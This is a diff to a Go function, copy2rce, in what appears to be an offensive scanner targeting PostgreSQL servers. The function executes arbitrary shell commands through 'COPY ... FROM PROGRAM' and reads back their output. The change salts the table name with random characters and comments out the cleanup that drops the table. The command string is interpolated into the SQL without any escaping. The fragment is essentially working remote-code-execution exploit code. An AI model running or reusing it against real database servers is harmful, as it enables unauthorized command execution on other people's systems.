@@ -128,12 +128,13 @@ func checkPostgres(target string, wg *sync.WaitGroup, sem chan struct{}, flags m
 func copy2rce(conn *pgx.Conn, cmd string) string {
 	ctx := context.Background()
 	var output string
+	salt := utils.RandStringRunes(5)
 
-	conn.Exec(ctx, "CREATE TABLE cmd_exec(cmd_output text);")
-	defer conn.Exec(ctx, "DROP TABLE IF EXISTS cmd_exec;")
+	conn.Exec(ctx, fmt.Sprintf("CREATE TABLE cmd_exec%s(cmd_output text);", salt))
+	// defer conn.Exec(ctx, fmt.Sprintf("DROP TABLE IF EXISTS cmd_exec%s;", salt))
 
-	conn.Exec(ctx, fmt.Sprintf("COPY cmd_exec FROM PROGRAM '%s';", cmd))
-	err := conn.QueryRow(ctx, "SELECT * FROM cmd_exec;").Scan(&output)
+	conn.Exec(ctx, fmt.Sprintf("COPY cmd_exec%s FROM PROGRAM '%s';", salt, cmd))
+	err := conn.QueryRow(ctx, fmt.Sprintf("SELECT * FROM cmd_exec%s;", salt)).Scan(&output)
 
 	if err != nil {
 		fmt.Println("Query failed: ", err)
